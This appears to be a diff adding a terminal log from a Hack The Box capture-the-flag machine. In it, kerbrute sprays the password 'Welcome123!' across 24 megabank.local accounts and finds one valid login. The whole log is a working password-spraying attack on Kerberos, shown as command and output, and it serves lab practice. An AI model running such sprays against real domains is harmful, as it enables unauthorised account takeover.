@@ -1,0 +1,44 @@
+Wed 15 Apr 2020 12:03:50 AM CEST  
+user@kali:/mnt/windows/htb/boxes/resolute$ kerbrute passwordspray -v --dc megabank.local -d megabank.local users.lst Welcome123!            
+
+    __             __               __                               
+   / /_____  _____/ /_  _______  __/ /____                           
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \                          
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/                          
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                                                                                 
+
+Version: v1.0.3 (9dad6e1) - 04/15/20 - Ronnie Flathers @ropnop       
+
+2020/04/15 00:03:59 >  Using KDC(s):                                 
+2020/04/15 00:03:59 >   megabank.local:88                            
+
+
+2020/04/15 00:05:10 >  [!] felicia@megabank.local:Welcome123! - Invalid password                                                           
+2020/04/15 00:05:10 >  [!] fred@megabank.local:Welcome123! - Invalid password                                                              
+2020/04/15 00:05:10 >  [!] annette@megabank.local:Welcome123! - Invalid password                                                           
+2020/04/15 00:05:10 >  [!] claude@megabank.local:Welcome123! - Invalid password                                                            
+2020/04/15 00:05:10 >  [!] claire@megabank.local:Welcome123! - Invalid password                                                            
+2020/04/15 00:05:10 >  [!] annika@megabank.local:Welcome123! - Invalid password                                                            
+2020/04/15 00:05:10 >  [!] angela@megabank.local:Welcome123! - Invalid password                                                            
+2020/04/15 00:05:10 >  [!] Administrator@megabank.local:Welcome123! - Invalid password                                                     
+2020/04/15 00:05:10 >  [!] abigail@megabank.local:Welcome123! - Invalid password                                                           
+2020/04/15 00:05:10 >  [!] gustavo@megabank.local:Welcome123! - Invalid password                                                           
+2020/04/15 00:05:10 >  [!] marko@megabank.local:Welcome123! - Invalid password                                                             
+2020/04/15 00:05:10 >  [!] marcus@megabank.local:Welcome123! - Invalid password                                                            
+2020/04/15 00:05:10 >  [!] naoki@megabank.local:Welcome123! - Invalid password                                                             
+2020/04/15 00:05:10 >  [!] paulo@megabank.local:Welcome123! - Invalid password                                                             
+2020/04/15 00:05:10 >  [!] simon@megabank.local:Welcome123! - Invalid password                                                             
+2020/04/15 00:05:10 >  [!] sally@megabank.local:Welcome123! - Invalid password                                                             
+2020/04/15 00:05:10 >  [!] ryan@megabank.local:Welcome123! - Invalid password                                                              
+2020/04/15 00:05:10 >  [!] per@megabank.local:Welcome123! - Invalid password                                                               
+2020/04/15 00:05:10 >  [!] steve@megabank.local:Welcome123! - Invalid password                                                             
+
+2020/04/15 00:05:11 >  [!] stevie@megabank.local:Welcome123! - Invalid password                                                            
+2020/04/15 00:05:11 >  [!] sunita@megabank.local:Welcome123! - Invalid password                                                            
+2020/04/15 00:05:11 >  [!] ulf@megabank.local:Welcome123! - Invalid password                                                               
+2020/04/15 00:05:11 >  [+] VALID LOGIN:  melanie@megabank.local:Welcome123!                                                                
+2020/04/15 00:05:11 >  [!] zach@megabank.local:Welcome123! - Invalid password                                                              
+2020/04/15 00:05:11 >  Done! Tested 24 logins (1 successes) in 71.351 seconds                                                              
+user@kali:/mnt/windows/htb/boxes/resolute$                            
+user@kali:/mnt/windows/htb/boxes/resolute$                            
+user@kali:/mnt/windows/htb/boxes/resolute$ sudo rdate -n megabank.local                                                                     
